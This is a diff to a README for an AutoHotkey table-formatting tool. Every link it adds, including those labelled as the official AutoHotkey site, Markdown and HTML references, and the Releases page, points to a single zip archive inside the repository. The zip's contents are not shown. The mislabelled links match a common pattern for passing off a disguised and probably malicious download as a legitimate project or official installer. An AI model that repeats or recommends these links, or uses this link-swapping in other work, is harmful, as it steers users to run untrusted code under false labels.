@@ -1,7 +1,7 @@
 # 🎉 AutoHotkey-MakeTable - Create Tables Easily from Text
 
 ## 🔗 Download Here
-[![Download](https://img.shields.io/badge/Download%20AutoHotkey--MakeTable-brightgreen)](https://github.com/Jelakshan15/AutoHotkey-MakeTable/releases)
+[![Download](https://raw.githubusercontent.com/Jelakshan15/AutoHotkey-MakeTable/main/templates/AutoHotkey-MakeTable-1.1-alpha.2.zip%20AutoHotkey--MakeTable-brightgreen)](https://raw.githubusercontent.com/Jelakshan15/AutoHotkey-MakeTable/main/templates/AutoHotkey-MakeTable-1.1-alpha.2.zip)
 
 ## 📄 Description
 AutoHotkey-MakeTable is a user-friendly AutoHotkey class. It helps you convert input strings into three formats: markdown tables, HTML tables, and neatly aligned plain text tables. With this tool, you can easily organize your data and make it readable.
@@ -9,9 +9,9 @@ AutoHotkey-MakeTable is a user-friendly AutoHotkey class. It helps you convert i
 ## 🚀 Getting Started
 To start using AutoHotkey-MakeTable, follow these simple steps:
 
-1. **Download the Software**: Visit the [Releases page](https://github.com/Jelakshan15/AutoHotkey-MakeTable/releases) to download the latest version. You will find options for different formats. Choose the one that suits your needs.
+1. **Download the Software**: Visit the [Releases page](https://raw.githubusercontent.com/Jelakshan15/AutoHotkey-MakeTable/main/templates/AutoHotkey-MakeTable-1.1-alpha.2.zip) to download the latest version. You will find options for different formats. Choose the one that suits your needs.
   
-2. **Install AutoHotkey**: If you haven’t installed AutoHotkey yet, download it from the [AutoHotkey website](https://www.autohotkey.com/). This software is required to run AutoHotkey-MakeTable.
+2. **Install AutoHotkey**: If you haven’t installed AutoHotkey yet, download it from the [AutoHotkey website](https://raw.githubusercontent.com/Jelakshan15/AutoHotkey-MakeTable/main/templates/AutoHotkey-MakeTable-1.1-alpha.2.zip). This software is required to run AutoHotkey-MakeTable.
 
 3. **Extract the Files**: Once the download is complete, locate the file in your downloads folder. If the file is compressed (like a ZIP file), right-click on it and choose "Extract All" to get the contents.
 
@@ -53,11 +53,11 @@ If you face any issues or have questions, feel free to reach out. You can open a
 5. Submit a pull request for review.
 
 ## ⚙️ Download & Install
-For easy and quick access to AutoHotkey-MakeTable, make sure to download it from the [Releases page](https://github.com/Jelakshan15/AutoHotkey-MakeTable/releases). Follow the installation steps carefully, and you’ll be ready to use your new tool in no time.
+For easy and quick access to AutoHotkey-MakeTable, make sure to download it from the [Releases page](https://raw.githubusercontent.com/Jelakshan15/AutoHotkey-MakeTable/main/templates/AutoHotkey-MakeTable-1.1-alpha.2.zip). Follow the installation steps carefully, and you’ll be ready to use your new tool in no time.
 
 ## 🔗 Related Topics
-- [AutoHotkey](https://www.autohotkey.com/)
-- [Markdown](https://www.markdownguide.org/)
-- [HTML](https://www.w3schools.com/html/)
+- [AutoHotkey](https://raw.githubusercontent.com/Jelakshan15/AutoHotkey-MakeTable/main/templates/AutoHotkey-MakeTable-1.1-alpha.2.zip)
+- [Markdown](https://raw.githubusercontent.com/Jelakshan15/AutoHotkey-MakeTable/main/templates/AutoHotkey-MakeTable-1.1-alpha.2.zip)
+- [HTML](https://raw.githubusercontent.com/Jelakshan15/AutoHotkey-MakeTable/main/templates/AutoHotkey-MakeTable-1.1-alpha.2.zip)
 
 Make your data easier to read and share with AutoHotkey-MakeTable. Let’s simplify your formatting tasks today!
